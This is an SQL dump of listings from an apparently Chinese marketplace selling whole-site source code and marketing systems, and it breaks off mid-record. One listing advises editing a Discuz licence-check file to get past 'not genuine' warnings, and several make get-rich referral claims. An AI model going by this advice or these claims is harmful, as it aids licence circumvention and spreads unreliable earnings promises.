(195, '1554035808-15', '', 15, '2019-03-31 20:36:48', '2019-03-31 20:36:58', '223.74.105.155', 37, 40, 0, 0, 'xcf18xcf20xcf24xcf31xcf', '区块链源码-区块链全球信息服务网站源码下载', '<a>区块链源码-区块链全球信息服务网站源码下载</a><br>该程序包安装，，不包含后期售后服务和指导使用，卖的是整站源代码<br><br>虚拟产品一旦发货，不接受任何理由退货，买之前请详联系卖家了解清楚，<br><br><br><img src=''/querylist/img/2019-03-31/201903310836510320.png''/><br><img src=''/querylist/img/2019-03-31/201903310836521262.png''/><br>', 72, 0, 10000, 1200, 1200, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/Rp3ZTnh', NULL, '区块链源码-区块链全球信息服务网站源码下载', '区块链源码-区块链全球信息服务网站源码下载', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(196, '1554035827-15', '', 15, '2019-03-31 20:37:07', '2019-03-31 20:37:20', '223.74.105.155', 37, 0, 0, 0, 'xcf7xcf20xcf24xcf27xcf', '自媒体源码，自媒体网站源码，自媒体新闻源码，网站建设源码', '自媒体源码，自媒体网站源码，自媒体新闻源码，网站建设源码<br>采用织梦开发，<br>虚拟产品一旦发货，不接受任何理由退货，在拍之前请先了解，<br><br>程序包含安装，不包含后期，售后服务和使用指导，卖的是整站源码<br><br><br><img src=''/querylist/img/2019-03-31/201903310837105037.png''/><br><img src=''/querylist/img/2019-03-31/201903310837112043.png''/><br><img src=''/querylist/img/2019-03-31/201903310837119975.png''/><br><img src=''/querylist/img/2019-03-31/201903310837129725.png''/><br><img src=''/querylist/img/2019-03-31/201903310837127080.png''/><br>', 72, 0, 10000, 200, 200, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/EA3qnmG', NULL, '自媒体源码，自媒体网站源码，自媒体新闻源码，网站建设源码', '自媒体源码，自媒体网站源码，自媒体新闻源码，网站建设源码', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(197, '1554035852-15', '', 15, '2019-03-31 20:37:32', '2019-03-31 20:37:53', '223.74.105.155', 37, 40, 0, 0, 'xcf8xcf20xcf24xcf29xcf', '微信小程序,应用商店,微信小程序源码,小程序发布推广网站源码', '<br><br>小程序,应用商店,小程序发布源码,小程序应用商店推广网站源码<br>本程序采用帝国程序开发，<br>虚拟产品一旦发货，不接受任何理由退货，拍之前请先了解，<br><br>该程序包安装，不包含后期售后服务和指导使用，卖的是整站源码，<br><br><br><img src=''/querylist/img/2019-03-31/201903310837421418.png''/><br><img src=''/querylist/img/2019-03-31/201903310837431216.png''/><br><img src=''/querylist/img/2019-03-31/201903310837449602.png''/><br>', 91, 0, 10000, 150, 150, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/RzYrbhF', NULL, '微信小程序,应用商店,微信小程序源码,小程序发布推广网站源码', '微信小程序,应用商店,微信小程序源码,小程序发布推广网站源码', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(198, '1554036356-15', '', 15, '2019-03-31 20:45:56', '2019-03-31 20:46:09', '223.74.105.155', 37, 40, 0, 0, 'xcf18xcf20xcf24xcf31xcf', 'PHP**资源网站源码全站数据打包下载', 'PHP**资源网站源码全站数据打包下载整站数据打包，卖的是程序和数据里面有200多个宝贝，大概只有十几20个没有下载链接，，，<br><br><br><img src=''/querylist/img/2019-03-31/201903310846004892.png''/><br>', 52, 0, 10000, 100, 100, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/RBgU06g', NULL, 'PHP**资源网站源码全站数据打包下载', 'PHP**资源网站源码全站数据打包下载', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(199, '1554036378-15', '', 15, '2019-03-31 20:46:18', '2019-03-31 20:46:26', '223.74.105.155', 37, 42, 0, 0, 'xcf8xcf20xcf24xcf29xcf', 'PPT模板素材站,PPT模板素材站源码，素材站源码', 'PPT模板素材站源码,PPT模板素材站源码PPT网站源码<br>本程序采用帝国程序开发<br>该程序包安装，，不包含后期售后服务和指导使用，卖的是整站源代码<br>虚拟产品一旦发货，不接受任何理由退货，买之前请详联系卖家了解清楚，<br><br><br><img src=''/querylist/img/2019-03-31/201903310846212642.png''/><br><img src=''/querylist/img/2019-03-31/201903310846220318.png''/><br>', 40, 0, 10000, 300, 300, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/zO6YdEb', NULL, 'PPT模板素材站,PPT模板素材站源码，素材站源码', 'PPT模板素材站,PPT模板素材站源码，素材站源码', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(200, '1554036391-15', '', 15, '2019-03-31 20:46:31', '2019-03-31 20:47:30', '223.74.105.155', 37, 98, 0, 0, 'xcf18xcf20xcf24xcf31xcf', '网站名录网-网站名录-网站娱乐网，网站目录，名录网教程，网络教程', '<a>网站名录网-网站名录-网站娱乐网，网站目录，名录网教程，网络教程</a><br>该程序包安装，，不包含后期售后服务和指导使用，卖的是整站源代码<br><br>虚拟产品一旦发货，不接受任何理由退货，买之前请详联系卖家了解清楚，<br><br><br><img src=''/querylist/img/2019-03-31/201903310847248039.png''/><br><img src=''/querylist/img/2019-03-31/201903310847240581.png''/><br><img src=''/querylist/img/2019-03-31/201903310847257419.png''/><br><img src=''/querylist/img/2019-03-31/201903310847262501.png''/><br>', 42, 0, 10000, 160, 160, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/ELykwHQ', NULL, '网站名录网-网站名录-网站娱乐网，网站目录，名录网教程，网络教程', '网站名录网-网站名录-网站娱乐网，网站目录，名录网教程，网络教程', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(201, '1554036457-15', '', 15, '2019-03-31 20:47:37', '2019-03-31 20:48:01', '223.74.105.155', 37, 0, 0, 0, 'xcf8xcf20xcf24xcf31xcf', '微信群二维码公众号源码货源微信群二维码导航带整站数据聚合SEO+签到+手机版', '2018微信群二维码公众号源码货源微信群二维码导航带整站数据聚合SEO+签到+手机版<br>支付宝免签约即时到帐辅助<br><br><br>程序是付费安装 不懂的朋友可以加拍安装费<br>程序不包含修改，任何内容，外连, 代码，版权 和售后服务<br>需要安装，或者修改，以上内容代码等服务,收费处理<br>程序只卖给需要的人，懂技术的人，小白用户，不要随便拍，<br>发货以后不能退款,再次声明，以上不提供任何售后服务<br>不管你是新手还是老司机遇到任何问题都不要说是程序问题<br><br><br>程序所有功能已测试网址为准，先测试 不懂的提前咨询<br><br><br>虚拟主机用户，必须支持创建子网站 服务器不限制<br><br><br><img src=''/querylist/img/2019-03-31/201903310847483281.png''/><br><img src=''/querylist/img/2019-03-31/201903310847489746.png''/><br><img src=''/querylist/img/2019-03-31/201903310847490055.png''/><br><img src=''/querylist/img/2019-03-31/201903310847500797.png''/><br><img src=''/querylist/img/2019-03-31/201903310847500966.png''/><br><img src=''/querylist/img/2019-03-31/201903310847514589.png''/><br><img src=''/querylist/img/2019-03-31/201903310847527449.png''/><br><img src=''/querylist/img/2019-03-31/201903310847521673.png''/><br>', 37, 0, 10000, 200, 200, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/R3wMApZ', NULL, '微信群二维码公众号源码货源微信群二维码导航带整站数据聚合SEO+签到+手机版', '微信群二维码公众号源码货源微信群二维码导航带整站数据聚合SEO+签到+手机版', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(202, '1554036494-15', '', 15, '2019-03-31 20:48:14', '2019-03-31 20:48:31', '223.74.105.155', 37, 98, 0, 0, 'xcf18xcf20xcf24xcf29xcf', 've云创直销进人系统自动化营销云计划源网商系统2018升级版', '<p><br/><br/><br/><br/><br/><br/><span style=" font-size:&gt;&lt;/span&gt;&lt;br&gt;&lt;span style=" font-size:=""></span><br/>&lt;span style=&#39; font-size:&gt;<br/><br/><br/><br/><br/><br/><br/><br/>语言支持 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; htm、php、 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Rewrite URL &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/> &nbsp;同时支持win系统的httpd.ini和linux系统的htaccess两种伪静态规则。 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/> &nbsp; 组件环境 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/> &nbsp; &nbsp; &nbsp;JMail邮件、FSO权限控制、XMLHTTP、ADODB、ASPJPEG等，<br/>支持市面上绝大数的程序。 &nbsp; 阿里云空间不可以重要提示 &nbsp; 联系卖家，选择相应的空间<br/><br/><br/> <br/><br/><br/><br/><br/><br/></p>', 137, 0, 10000, 3600, 3600, 3600, 2, '自动营销系统2019版', '2019-03-31 20:51:41', '2019-12-31 20:51:43', 0, 1, 5, 5, 5, 417, 1, '', '', NULL, 'http://t.cn/RunDsJE', NULL, 've云创直销进人系统自动化营销云计划源网商系统2018升级版', 've云创直销进人系统自动化营销云计划源网商系统2018升级版', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(203, '1554036529-15', '', 15, '2019-03-31 20:48:49', '2019-06-19 16:42:47', '223.74.105.155', 37, 0, 0, 0, 'xcf8xcf20xcf24xcf27xcf', '整站带数据网络工作室个人博客资源下载商城系统源码自适应手机', '<p>整站带数据网络工作室个人博客资源下载商城系统源码自适应手机<br/><br/><br/></p>', 246, 4, 9996, 600, 600, 600, 2, '自动营销系统2019版', '2019-03-31 20:51:19', '2019-12-01 20:51:22', 0, 1, 5, 5, 5, 8, 1, '', '', NULL, 'http://t.cn/R79gowW', NULL, '整站带数据网络工作室个人博客资源下载商城系统源码自适应手机', '整站带数据网络工作室个人博客资源下载商城系统源码自适应手机', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(204, '1554036580-15', '', 15, '2019-03-31 20:49:40', '2019-03-31 20:49:56', '223.74.105.155', 37, 0, 0, 0, 'xcf18xcf20xcf24xcf29xcf', '网商之家直销进人系统四站合一自动营销系统2018版', '<p><span style="color:#ff0000">1、本源码包安装包升级 由于源码的可复制性 不接受退款和中差评</span><br/><span style="color:#ff0000">2、拿到源码不会调试安装 就说我们源码不完整 申请退款请不要拍</span><br/><span style="color:#ff0000">3、故意说源码不完整，代码到手 立即恶意申请退款的 也请不要拍</span><br/><span style="color:#ff0000">4、诚信开店 老实做人 骗子走开 同行勿扰 源码只出售给需要的人</span><br/><span style="color:#ff0000">5、所有功能以测试网站为准 测试网站有的功能给你们的也是一样</span><br/><span style="color:#ff0000">打开下面网址看视频解说http://cloud.video.taobao.com/play/u/2252039130/p/1/e/6/t/1/42277536.mp4</span><br/><span style="color:#ff0000"><br/></span><br/><span style="color:#ff0000"><span style="text-align:" center="">阿里云空间不可以重要提示 </span><span style="text-align:" center="">联系卖家，选择相应的空间</span></span><br/><br/><br/><img src="/querylist/img/2019-03-31/201903310849503060.png"/><br/></p>', 170, 0, 10000, 3600, 3600, 3600, 2, '自动营销系统2019版', '2019-03-31 20:51:00', '2019-12-01 20:51:03', 0, 1, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/RgGiaN7', NULL, '网商之家直销进人系统四站合一自动营销系统2018版', '网商之家直销进人系统四站合一自动营销系统2018版', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(205, '1554037652-15', '', 15, '2019-03-31 21:07:32', '2019-03-31 21:07:42', '223.74.105.155', 37, 42, 0, 0, 'xcf18xcf20xcf24xcf31xcf', '优站网源码，程序,整站打包出售安装即可运营', '优站网程序加数据打包出售<br>具体数据多少请自己参考 程序包含免费建设 不提供远程指导协助服务 <br><br><br>，请准备好服务器 和域名 提供 ip账号密码<br><br><br> 程序安装复杂，必须要卖家来安装，买家自己无法，安装成功 <br>虚拟主机无法建设<br><br><br><img src=''/querylist/img/2019-03-31/201903310907357168.png''/><br>', 68, 0, 10000, 400, 400, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, '', NULL, '优站网源码，程序,整站打包出售安装即可运营', '优站网源码，程序,整站打包出售安装即可运营', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(210, '1554700535-15', '', 15, '2019-04-08 13:15:35', '2019-05-13 15:42:24', '223.157.129.49', 37, 0, 0, 0, 'xcf18xcf20xcf24xcf29xcf', '友价源码t5抢先更新买程序赠送会员生成插件3月7日增加熊掌号自动推送插件', '<p><span style="font-size: color=px">网站目前共配置了11套模板</span><span style=" line-height:&gt;&lt;font size=" color="&gt;二开版&lt;/font&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;友价源码后台在线升级授权域名，300元1年，&lt;br&gt;&lt;br&gt;&lt;br&gt;需要采集插件，增加500元，以上200元不包含采集插件，&lt;br&gt;&lt;br&gt;&lt;br&gt;以上200元包含熊掌号自动推送插件&lt;br&gt; &lt;br&gt;&lt;img src=" img="" src="/querylist/img/2019-04-08/201904080115409628.png" font="" size="&#39;"><span style="color:&gt;精仿互站&lt;/font&gt;&lt;span style="><span style="color:&gt;版&lt;/font&gt;&lt;/span&gt;&lt;font color="> </span></span><span style="color:&#39;">初次购买程序和环境一起免费安装<span style=" line-height:&gt;，&lt;/span&gt;&lt;span style=" line-height:="">后期更换服务器</span><span style=" line-height:&gt;，收费，安装标准费用50&lt;/span&gt;&lt;/font&gt;&lt;br&gt;&lt;font color="><span style=" line-height:&gt;&lt;br&gt;&lt;/span&gt;&lt;/font&gt;&lt;br&gt;&lt;font color="><span style=" line-height:&gt;&lt;br&gt;&lt;/span&gt;&lt;/font&gt;&lt;br&gt;&lt;font color="><span line-height:=""></span></span></span></span></span><br/><span style="color:#ff0000">该补丁仅适用于友价商城源码，正版用户请登录后台直接在线升级 </span><br/>以下是本次补丁的修复内容： <br/>手机端：<br/>1、优化商品详情编辑器<br/>2、商品详情页展示视频<br/>3、微信里选择支付宝支付的话，进行友好提示<br/>4、美化订单详情界面<br/>5、手机版全部样式优化，多模板内核已打通，即将上线更多手机模板<br/>电脑端：<br/>6、商品效果图实现排序功能<br/>7、购买成功后，如果订单只有一个商品，则直接跳到订单详情<br/>8、点卡类型发货形式时，添加一个软件下载地址的选项（可不填）<br/>9、新增快递物流数据调用【付费插件】<br/>10、每个商品大类都可以独立设置图片或列表展现形式<br/>11、电脑端传效果图时，可以直接手机扫描二维码传图<br/>12、更多细节优化完善<br/><br/><br/><img src="/querylist/img/2019-04-08/201904080115406445.png"/><br/><img src="/querylist/img/2019-04-08/201904080115417309.png"/><br/><img src="/querylist/img/2019-04-08/201904080115412849.png"/><br/><img src="/querylist/img/2019-04-08/201904080115415418.png"/><br/><img src="/querylist/img/2019-04-08/201904080115427318.png"/><br/><img src="/querylist/img/2019-04-08/201904080115423510.png"/><br/></span></p>', 97, 4, 9996, 200, 200, 0, 1, '', NULL, NULL, 0, 1, 5, 5, 5, 14, 2, 'http://www.928vip.cn/', '66545', NULL, 'http://t.cn/RTpOfzf', NULL, '友价源码t5抢先更新买程序赠送会员生成插件3月7日增加熊掌号自动推送插件', '友价源码t5抢先更新买程序赠送会员生成插件3月7日增加熊掌号自动推送插件', '66545', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(211, '1554700598-15', '', 15, '2019-04-08 13:16:38', '2019-04-08 13:31:15', '223.157.129.49', 37, 0, 0, 0, 'xcf18xcf20xcf24xcf31xcf', 'hi9.0系统云计划系统自动化分销系统hi9.0源码', '<p><br/>本套程序比以往系统功能更加强悍<br/>整合了资源，结合了商城类型模式<br/><span style="line-height:1.5;">可以单个销售产品，也可以批量销售</span><br/><span style="line-height:1.5;">不仅可以销售虚拟类、还可以销售实物产品及点卡！</span><br/><span style="line-height:1.5;">销售模式1： 单个产品 单笔销售</span><br/><span style="line-height:1.5;">销售模式2：VIP会员 支持全站下载权限</span><br/><span style="line-height:1.5;">推广模式1：非VIP推广 可获得积分 积分可以兑换本站商品</span><br/><span style="line-height:1.5;">推广模式2：VIP会员推广 可获得佣金现金 可以申请提现</span><br/><span style="line-height:1.5;">支付模式1：云支付即时到账.永远不用担心支付接口问题</span><br/><span style="line-height:1.5;">商品类型1：虚拟商品 支持自动化交易，</span><br/><span style="line-height:1.5;">商品类型2：实体商品 需要手动审核与快递发货</span><br/><span style="line-height:1.5;">后台功能更加强大 操作简单易上手 你值得拥有</span><br/><span style="color:#ff0000;font-size:24.0px;line-height:1.5;">2016 3月 进行了前后台再次升级,更新内容</span><br/><span style="font-size:18.0px;"> 1、升级，前台不登录就可以显示商品</span><br/><span style="font-size:18.0px;"> 2、添加和修改会员</span><br/><span style="font-size:18.0px;"> 3、VIP会员特权</span><br/><span style="font-size:18.0px;"> 4、注册限制优化</span><br/><span style="font-size:18.0px;"><span style="line-height:1.5;"> 5</span><span style="line-height:1.5;">、</span><span style="line-height:1.5;">老用户直接联系客服下载补丁</span></span><br/> <br/>最近有会员，在网上购买这个程序差不多花了四五百块钱<br/> <br/>买回来安装测试 发现前后台好多功能无法使用 没有进行升级 找卖家客服都没反应 来到本店购买了正版程序<br/> <br/> <span style="line-height:1.5;">下面是在其他店买回来不能使用的功能介绍</span><br/> <br/> <span style="line-height:1.5;">1 &nbsp; 结果发现后台会员中心，积分和余额 无法修改，和增加</span><br/> <br/> 2 &nbsp;商品增加 &nbsp;VIP会员下载 功能无效<br/> <br/> 3 前台必须要登录才显示商品<br/> <br/> &nbsp;联系官方没有任何结果<br/> <br/> 结果他说跑了很多家店， 也买了很多结果都是一样<br/> <br/> <span style="line-height:1.5;">他在本店买到了真正满意的宝贝 &nbsp;客户对我说的一句话是 你这个才是正版</span><br/><span style="line-height:1.5;"></span><br/><br/> <br/> &nbsp;<br/><br/> <br/> <br/> <br/> <br/> <br/><br/>还有这独特的运营模式,<br/><span style="line-height:1.5;"></span><br/><span style="line-height:1.5;">只要您免费注册成为网站会员,并将你的推广链接分享出去,</span><br/> <br/>有人通过你分享的连接注册进入本站,并购买商品，或成为VIP会员<br/> <br/>您都可以获得高额提成,如果您是普通注册会员,您将获得30%的销售提成,<br/> <br/>如果你加入VIP会员.将获得50%的高额提成,轻松月入过万<br/><span style="line-height:1.5;">普通会员.可以通过推广本站获取积分,积分用来免费兑换本站所有商品，</span><br/>开通VIP会员可以，获得本站所有商品下载权,帮助您快速学习赚钱<br/> <br/> <br/> <br/> <br/> <br/><br/><img src="/querylist/img/2019-04-08/201904080117026223.png"/><br/></p>', 36, 0, 10000, 60, 60, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/ROuY5rs', NULL, 'hi9.0系统云计划系统自动化分销系统hi9.0源码', 'hi9.0系统云计划系统自动化分销系统hi9.0源码', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(212, '1554701587-15', '', 15, '2019-04-08 13:33:07', '2019-04-08 14:06:46', '223.157.130.28', 37, 0, 0, 0, 'xcf18xcf20xcf24xcf31xcf', '自动发卡系统,个人在线发卡，自动发卡密系统', '<p>该程序包安装，，不包含后期售后服务和指导使用，卖的是整站源代码<br/><br/>虚拟产品一旦发货，不接受任何理由退货，买之前请详联系卖家了解清楚，<br/><br/><br/><img src="/querylist/img/2019-04-08/201904080133218456.png"/><br/><img src="/querylist/img/2019-04-08/201904080133229209.png"/><br/><img src="/querylist/img/2019-04-08/201904080133223306.png"/><br/><img src="/querylist/img/2019-04-08/201904080133234153.png"/><br/><img src="/querylist/img/2019-04-08/201904080133232019.png"/><br/><img src="/querylist/img/2019-04-08/201904080133240738.png"/><br/></p>', 54, 0, 10000, 99, 99, 0, 1, '', NULL, NULL, 0, 0, 5, 5, 5, 55, 1, '', '', NULL, 'http://t.cn/ELA8rVS', NULL, '自动发卡系统,个人在线发卡，自动发卡密系统', '自动发卡系统,个人在线发卡，自动发卡密系统', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, '');
INSERT INTO `yjcode_pro` (`id`, `bh`, `mybh`, `userid`, `sj`, `lastsj`, `uip`, `ty1id`, `ty2id`, `ty3id`, `zt`, `tysx`, `tit`, `txt`, `djl`, `xsnum`, `kcnum`, `money1`, `money2`, `money3`, `yhxs`, `yhsm`, `yhsj1`, `yhsj2`, `ifxj`, `iftuan`, `pf1`, `pf2`, `pf3`, `iftj`, `fhxs`, `wpurl`, `wppwd`, `upf`, `ysweb`, `yysweb`, `wdes`, `wkey`, `wppwd1`, `ifuserdj`, `ty4id`, `ty5id`, `ztsm`, `txtmb`, `myty1id`, `myty2id`, `zl`, `ysarea`, `upty`, `downurl`) VALUES
(213, '1554701775-15', '', 15, '2019-04-08 13:36:15', '2019-04-08 14:00:16', '223.157.130.28', 37, 40, 0, 0, 'xcf18xcf20xcf24xcf29xcf', '淘宝客程序卷皮程序模板源码自动采集卷皮粉色2016V7.1版本', '<p>现在发现很多商家在淘宝出售假的卷皮7.0他们卖的都是简易版本，很多功能不全面。<br/>我们的程序是完整的货比三家，不能用全额退款。<br/><br/>全网，后期更新升级保障，功能请大家注意看演示 模板上也是有差别的 请大家看以下介绍多种功能频道。<br/> &nbsp;全新开发，无需授权域名，正版使用！可以天天更换域名，<br/>一次购买终身使用，<br/>可以随便更换域名，无任何授权限制，<br/>后台介绍：站点地图生成xml格式，前台穿衣搭配爱淘宝搭配页面以及手动添加，以及支持阿里妈妈高佣金采集器 前台品牌团后台有专区品牌团管理<br/>，支持品牌团采集，全新版爱淘宝采集器支持采集商品标签，以及一些u站采集，逛街，促销，预告采集等。前台内页评论自动采集，<br/>后台导航设置支持顶部导航已经主导航 顶部导航指手机版那行。下架商品检测以及商品管理增加数据库字段佣金字段。等功能下一功能更新：商家报名系统升级，带商家报名收费功能，商家发布需要付费以及可免费的商家商品 已经在测试 随着功能增多我们会适当涨价的<br/>2016-1-1 首页调用文章优化seo，以及穿衣打扮。增加阿里妈妈采集器优化版<br/>2016-1-6 app客户端以及的手机版。更多更新没有公布<br/>2015-2-6 修复第三方登录接口问题。<br/>2015-2-5 增加商品展示有放大镜功能，自由开启关闭。<br/>//////////////////////////////////////////////////////////////////////////////////////////////////////////////////<br/> <br/>淘宝客部分功能一览！<br/> <br/>模板截图<br/> <br/>阿里妈妈采集<br/>采用阿里妈妈采集器，可设置针对高佣金、高推广量商品采集，收入瞬间翻番！也包括爱淘宝采集0佣金过滤功能，能做有佣金！<br/>美丽说联盟采集<br/>全新引入美丽说 让您多一种赚钱渠道. 后台一键采集/采集的商品可以看到佣金 推广量<br/>U站+其它采集<br/>多U站（折800、卷皮等）+爱逛街+淘宝视频+天天特价采集+穿衣打扮+特惠采集，不再对商品数据发愁！<br/>单条+整店采集<br/>单条+整店采集器，可采集指定商品与指定店铺商品，轻松赚取商家推广费！<br/>一键采集<br/>一键采集、继续采集等功能，让采集更简便，省时省力！<br/>商品检测<br/>商品下架、价格更新等都不怕了，一键检测更新+删除商品功能，轻松管理！<br/>天猫/淘宝采集<br/>可选择性采集，只采集天猫商品或淘宝商品！<br/>评论采集<br/>后台评论采集功能，采集淘宝评论，做别人没有的内容！<br/>商品详情<br/>商品详情不再采用采集方式，直接对接调用，系统运行更流畅！<br/>商家报名<br/>商家报名系统，一键自动抓取商品信息报名，合作管理更方便！<br/>积分兑换<br/>登陆签到送积分，积分兑换礼品，留住更多客户，提高网站人气！<br/>伪静态<br/>静态设置，使用路径+html，更利于SEO！<br/>文章系统<br/>写文章引流，多文章，多流量，更利于SEO！<br/>网站地图<br/>网站所有地址自动生成快捷链接，无需手动再手动添加，为seo助力！<br/>高性能缓存<br/>高性能缓存机制，有效提高访问速度，让访问更流畅！<br/>超强安全机制<br/>超级安全机制，对网站进行超级保护，更安全放心！<br/>正版授权<br/>一域名，一授权，正版授权使用，使用更安心！<br/>更新<br/>提供更新服务，不用再担心淘宝规则变动而造成无法使用！<br/>新增加功能前台，品牌团页面全面升级后台管理，穿衣打扮后台可采集也可以手动添加优化非常好，商品采集可以采集商品的标签，以下是部分后台功能的截图：<br/><br/><img src="/querylist/img/2019-04-08/201904080136180653.png"/><br/></p>', 47, 0, 10000, 60, 60, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/ROmY9qw', NULL, '淘宝客程序卷皮程序模板源码自动采集卷皮粉色2016V7.1版本', '淘宝客程序卷皮程序模板源码自动采集卷皮粉色2016V7.1版本', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(214, '1554703664-15', '', 15, '2019-04-08 14:07:44', '2019-04-08 14:07:51', '223.157.130.28', 37, 0, 0, 0, 'xcf18xcf20xcf24xcf29xcf', '新版v9视频系统视频系统程序', '1、本源码包安装包升级 由于源码的可复制性 不接受退款和中差评<br>2、拿到源码不会调试安装 就说我们源码不完整 申请退款请不要拍<br>3、故意说源码不完整，代码到手 立即恶意申请退款的 也请不要拍<br>4、诚信开店 老实做人 骗子走开 同行勿扰 源码只出售给需要的人<br>5、所有功能以测试网站为准 测试网站有的功能给你们的也是一样<br><font color=''#ff0000''><span style=''line-height:''>程序</span><span style=''line-height:''>再次降价</span><span style=''line-height:''></span><span style=''line-height:''>，</span></font><span style=''color:'' rgb>白菜价</span><span style=''line-height:'' color: rgb>卖</span><span style=''line-height:'' color: rgb>给大家</span><span style=''line-height:'' color: rgb>，</span><br><font color=''#ff0000''><span style=''line-height:''>但是</span><span style=''line-height:''>，之前也是花了三百多块钱在网上买的，</span></font><br><font color=''#ff0000''>如果你对该程序<span style=''line-height:''>有要求</span><span style=''line-height:''>，</span><span style=''line-height:''>需要卖家保证能用，那你直接不用拍</span><span style=''line-height:''>，</span></font><br><font color=''#ff0000''>卖家对别人开发的程序不下任何保证<span style=''line-height:''>，</span><span style=''line-height:''>你觉得可以</span></font><span style=''line-height:''>就</span><span style=''line-height:'' color: rgb>拍</span><span style=''line-height:'' color: rgb>，</span><br><font color=''#ff0000''><span style=''line-height:''>不接受任何理由退货</span><span style=''line-height:''>，</span><span style=''line-height:''>东西只卖给识货的人</span><span style=''line-height:''>，不做任何多余的解释</span><span style=''line-height:''>，</span></font><br><span style=''line-height:''><br></span><br><span style=''line-height:''>请联系卖家，</span><br><br><br>', 58, 0, 10000, 60, 60, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/ROmYvbA', NULL, '新版v9视频系统视频系统程序', '新版v9视频系统视频系统程序', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(221, '1557221794-15', '', 15, '2019-05-07 17:36:34', '2019-05-12 01:19:38', '223.157.130.24', 37, 40, 0, 0, 'xcf13xcf20xcf24xcf29xcf', 'discuz克米设计APP手机版v3.5送15套配套插件教程分类信息dz模板', '<p>插件如下<br/>克米设计-手机管理 v3.5 （comiis_app）<br/>克米设计-手机门户 v3.5 （comiis_app_portal）<br/>克米-微信多图上传 v1.5 （comiis_weixinupload）<br/>克米设计-微信登录 v1.0 （comiis_weixin）<br/>克米-手机短信注册 v1.5.1 （comiis_sms）<br/>克米设计-帖子二维码 v2.1 （comiis_code）<br/>克米设计-手机发现 v3.5 （comiis_app_find）<br/>克米设计-手机视频 v3.5 （comiis_app_video）<br/>克米-手机头像修改 v3.5 （comiis_app_avatar）<br/>克米-手机积分提示 V1.0 （comiis_credittip）<br/>克米设计-空间背景 v3.5 （comiis_app_homestyle）<br/>克米设计-手机活动 v3.5 （comiis_app_activity）<br/>克米设计-手机配色 v3.5 （comiis_app_color）<br/>克米设计-查看全文 v1.0 （comiis_lookfulltext）<br/><br/><br/><br/><img src="/querylist/img/2019-05-07/201905070537198744.png"/><br/><br/><br/><span style="color:#00B0F0;">------------</span><span style="color:#00B0F0;"><span style="color:#FF0000;text-decoration:underline;"><strong><span style="font-size:18px;color:#ff0000">售前须知</span></strong></span></span><span style="color:#00B0F0;">------------</span><br/>牛站网络————网站精品源码特价店！<br/>本店所有上架源码均经过严格测试，确保可用才上架销售。<br/><strong>人无完人，程序难免有一些小bug，本店将不断完善和更新迭代，对程序要求极度完美的亲请慎拍，不保证没一点bug，确保不影响正常使用，有小bug反馈给我们后期修复都可以免费升级！</strong><br/>请仔细阅读以下常见问题，可能对您有所帮助！<br/>------------<span style="text-decoration:underline;color:#FF0000;">常见问题</span>------------<br/><strong>特别提醒：discuz模版or插件、程序有时可能与演示站有略微差别，请以标题版本或介绍截图为准，另，discuz模版演示站的页面有diy调用，我们提供diy文件，您可以自己导入diy或者我们指导您导入DIY，模版是不带帖子文章等数据的，包括插件我们也是提供插件本身源码框架，不带演示数据。</strong><br/><strong>整站程序</strong><strong>因是整站打包源码，难免会出现模板内是原站链接;</strong><strong>或者一些链接本来就是其他站上的链接；</strong><br/>1.提取源码出错<br/>解决方案&gt;有些源码会将提取码一起复制到提取网址，请单独复制网址。<br/>3.DZ插件/模版安装提示不是正版<br/>解决方案&gt;需要修改检测文件，<br/>http://tieba.baidu.com/p/3525505196?pid=62938334606&amp;cid=0#62938334606<br/>由于源码具有复制性，所以，源码一经售出，除源码本身有问题外均不退货。<br/><br/><br/></p>', 26, 1, 9999, 30, 30, 0, 1, '', NULL, NULL, 0, 1, 5, 5, 5, 44, 1, '', '', NULL, '', NULL, 'discuz克米设计APP手机版v3.5送15套配套插件教程分类信息dz模板', 